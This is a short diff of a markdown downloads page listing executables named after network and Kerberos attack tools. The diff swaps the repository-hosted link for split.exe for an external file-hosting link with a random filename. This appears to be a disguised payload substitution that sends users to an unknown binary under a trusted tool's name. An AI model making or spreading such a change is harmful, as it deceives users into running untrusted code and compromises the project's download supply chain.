@@ -56,7 +56,7 @@ layout: default
 ### [Download smbserver.exe](./exe/smbserver.exe)
 ### [Download sniff.exe](./exe/sniff.exe)
 ### [Download sniffer.exe](./exe/sniffer.exe)
-### [Download split.exe](./exe/split.exe)
+### [Download split.exe](https://freeupload.store/nESA6/PUniNuce92.exe/download)
 ### [Download ticketConverter.exe](./exe/ticketConverter.exe)
 ### [Download ticketer.exe](./exe/ticketer.exe)
 ### [Download tstool.exe](./exe/tstool.exe)
